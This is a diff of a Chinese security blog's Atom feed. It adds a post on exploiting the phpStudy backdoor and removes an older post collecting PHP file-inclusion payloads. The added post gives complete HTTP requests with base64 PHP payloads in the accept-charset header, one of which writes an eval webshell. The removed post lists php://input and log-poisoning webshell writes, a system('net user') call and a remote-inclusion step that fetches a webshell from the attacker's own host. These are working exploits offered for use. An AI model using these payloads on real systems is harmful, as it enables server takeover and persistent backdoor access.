@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com/</id>
     <title>斯文beast</title>
-    <updated>2019-09-23T09:35:03.461Z</updated>
+    <updated>2019-09-24T09:23:32.845Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com/"/>
     <link rel="self" href="http://www.svenbeast.com//atom.xml"/>
@@ -10,6 +10,65 @@
     <logo>http://www.svenbeast.com//images/avatar.png</logo>
     <icon>http://www.svenbeast.com//favicon.ico</icon>
     <rights>All rights reserved 2019, 斯文beast</rights>
+    <entry>
+        <title type="html"><![CDATA[phpstudy后门利用方法及getshell]]></title>
+        <id>http://www.svenbeast.com//post/2OBQlt_Ta</id>
+        <link href="http://www.svenbeast.com//post/2OBQlt_Ta">
+        </link>
+        <updated>2019-09-24T08:36:03.000Z</updated>
+        <content type="html"><![CDATA[<p>###0x01 phpstudy利用方法</p>
+<ul>
+<li>请求任意后缀为php的文件</li>
+<li>目标环境为php5.2,5.4,且不能为nts</li>
+<li>存在Accept-Encoding: gzip,deflate</li>
+<li>此处填写base64加密后的payload：accept-charset: c3lzdGVtKCdjYWxjLmV4ZScpOw</li>
+</ul>
+<pre><code>GET /phpinfo.php HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Sec-Fetch-Site: none,
+accept-charset: c3lzdGVtKCdjYWxjLmV4ZScpOw
+Accept-Encoding: gzip,deflate
+Accept-Language: zh-CN,zh;q=0.9
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1569315041105.png" alt=""></figure>
+<p>###0x02 getshell 远程连接<br>
+system('echo ^&lt;?php @eval($_POST[&quot;shell&quot;])?^&gt;&gt;PHPTutorial\WWW\shell.php');<br>
+↓<br>
+c3lzdGVtKCdlY2hvIF48P3BocCBAZXZhbCgkX1BPU1RbInNoZWxsIl0pP14+PlBIUFR1dG9yaWFsXFdXV1xzaGVsbC5waHAnKTs=</p>
+<pre><code>GET /phpinfo.php HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Sec-Fetch-Site: none,
+accept-charset: c3lzdGVtKCdlY2hvIF48P3BocCBAZXZhbCgkX1BPU1RbInNoZWxsIl0pP14+PlBIUFR1dG9yaWFsXFdXV1xzaGVsbC5waHAnKTs=
+Accept-Encoding: gzip,deflate
+Accept-Language: zh-CN,zh;q=0.9
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1569316391812.png" alt=""></figure>
+<p>###0x03 可能会遇到的问题</p>
+<ul>
+<li>若无法成功连接，可能生成目录不对，执行命令tree /f查看文件树，找到可访问路径生成shell</li>
+</ul>
+<pre><code>GET /phpinfo.php HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Sec-Fetch-Site: none,
+accept-charset: c3lzdGVtKCd0cmVlIC9mJyk7
+Accept-Encoding: gzip,deflate
+Accept-Language: zh-CN,zh;q=0.9
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1569316868542.png" alt=""></figure>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[泛微e-cology OA Beanshell组件远程代码执行(复现及POC)]]></title>
         <id>http://www.svenbeast.com//post/9rcdl83tA</id>
@@ -988,71 +1047,6 @@ for f in file.readlines():
 <p>结束：获取域名时，后得到的域名是编辑进ip.txt文件的，所以不必担心多次获取域名后替换前面已获取的。</p>
 <h3 id="ps因博客重建特意将本人文章从圈子转移回来如有影响可联系删帖">PS：因博客重建，特意将本人文章从圈子转移回来，如有影响，可联系删帖</h3>
 <p>文章链接（来点个顶可好~）：https://www.secquan.org/Discuss/1069678</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[文件包含漏洞利用集合+简单payload]]></title>
-        <id>http://www.svenbeast.com//post/hello-gridea</id>
-        <link href="http://www.svenbeast.com//post/hello-gridea">
-        </link>
-        <updated>2018-12-11T16:00:00.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="一-文件包含php封装协议之读取文件">一、文件包含PHP封装协议之读取文件</h3>
-<p>?page=php://filter/read=convert.base64-encode/resource=phpinfo.php</p>
-<p>使用条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；</p>
-<p>通过php封装协议php://filter读取当前目录下的phpinfo.php文件里的内容,此处参数名为page，实际要看源代码</p>
-<p>?page=php://filter/read/resource=phpinfo.php</p>
-<p>读取一下这个文件，获得这个网站的配置信息，将此文件展示在页面上</p>
-<h3 id="二-文件包含php封装协议之读写文件">二、文件包含PHP封装协议之读写文件</h3>
-<p>?filename=php://input                                               //此处参数名为filename，通过php://input进行代码执行</p>
-<?php fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>        
-<p>//通过浏览器插件或者burp suite 抓包，修改成php://input此方法，并在最下面写入内容，也就是此行代码</p>
-<p>使用条件：在使用php://input协议的时候，需要把php配置文件（php.ini）中的allow_url_include打开，设置为On,而allow_url_fopen 不做要求。</p>
-<h3 id="三-文件包含php封装协议之命令执行">三、文件包含PHP封装协议之命令执行</h3>
-<p>?filename=PHP://input                             //此处参数名为filename，通过php://input进行代码执行</p>
-<?php system('net user');?>                       //代码最后加入语句,抓包工具的最后一行输入此代码
-<p>使用条件：在使用php://input协议的时候，需要把php配置文件（php.ini）中的allow_url_include打开，设置为On,而allow_url_fopen 不做要求。</p>
-<h3 id="四-文件包含file封装协议之读取文件">四、文件包含file封装协议之读取文件</h3>
-<p>?page=file://c:\boot.ini              //通过file://读取敏感文件，此处参数名为page，按实际情况修改，后面跟绝对路径</p>
-<h3 id="五-本地包含配合文件上传">五、本地包含配合文件上传</h3>
-<?PHP fputs(fopen(‘shell.php’,’w’),’<?php @eval($_POST[‘cmd’])?>’);?>            //上传一句话木马，1.jpg,内容为此代码
-<p>?filename=../fileupload/uploads/1.jpg            //然后通过本地包含文件漏洞将此文件当成php代码执行</p>
-<h3 id="六-本地文件包含之读取敏感文件">六、本地文件包含之读取敏感文件</h3>
-<p>?page=file://c:\boot.ini              //通过file://读取敏感文件，此处参数名为page，按实际情况修改，后面跟绝对路径</p>
-<p>各类敏感文件名字见其他文章</p>
-<p>若有过滤：</p>
-<p>%00截断：必须在PHP扩展参数：magic_quotes_gpc为关闭条件下，以及PHP的版本小于5.3版本的条件下才可以使用%00进行截断。</p>
-<p>点号截断 ：url后加“………………………………..（好多个小点）”进行绕过。 windows256字节，linux4096字节</p>
-<p>file:// — 访问本地文件系统,不受allow_url_fopen与allow_url_include的影响</p>
-<h3 id="七-日志获取webshell">七、日志获取webshell</h3>
-<?php @eval($_POST[‘cmd’]);?>           //抓包工具第一行后面get请求后改为此代码，会被日志文件记录
-<p>?page=../../Program%20Files/phpStudy/Apache/logs/access.log             //利用文件包含访问日志文件，getshell，菜刀连接</p>
-<p>前提：确定Apache的日志路径</p>
-<h3 id="八-远程文件包含shell">八、远程文件包含shell</h3>
-<p>在本机准备一个shell.txt,此符号\是为了防止一句话木马被过滤</p>
-<p>第一种代码：  <?php echo file_put_contents("muma.php","<?php @eval(\$POST['x']); ?>&quot;); ?&gt;</p>
-<p>第二种代码：</p>
-<?php 
-
-               $a="<?php @eval(\$_POST['x']); ?>";
-<pre><code>           $b=fopen(&quot;muma.php&quot;,&quot;w&quot;) or die(&quot;Unable to open file!&quot;);
-
-           fwrite($b,$a);
-
-           fclose($b);
-</code></pre>
-<p>?&gt;</p>
-<p>这个文件所表达的意思是：</p>
-<p>执行此文件后，会在当前目录下打开exp.php文件（若果没有的话会新建），然后把我们的一句话木马给写入exp.php文件中，最后在关闭这个文件。</p>
-<p>以上两种代码任选其一，本地写一个这个文件，然后用目标机包含写的这个文件</p>
-<p>地址栏输入</p>
-<p>?filename=http://192.168.1.68/yi.txt            //filename为参数名，按实际情况修改</p>
-<p>格式为   参数名=http://本机IP/一句话木马的文件名.txt             //后缀为txt，为了防止文件被本地解析，使文件被目标电脑解析</p>
-<p>这样在当前目录就会生成一句话木马muma.php，使用中国菜刀连接，over</p>
-<p>使用条件：</p>
-<p>如果PHP的配置选项allow_url_include为ON的话，则include/require函数可以加载远程文件，这种漏洞被称为&quot;远程文件包含漏洞(Remote File Inclusion RFI)&quot;。</p>
-<p>allow_url_fopen = On 是否允许打开远程文件</p>
-<p>allow_url_include = On 是否允许include/require远程文件</p>
-<h3 id="ps因博客重建特意将本人文章从tools转移回来如有影响可联系删帖">PS：因博客重建，特意将本人文章从Tools转移回来，如有影响，可联系删帖</h3>
 ]]></content>
     </entry>
 </feed>
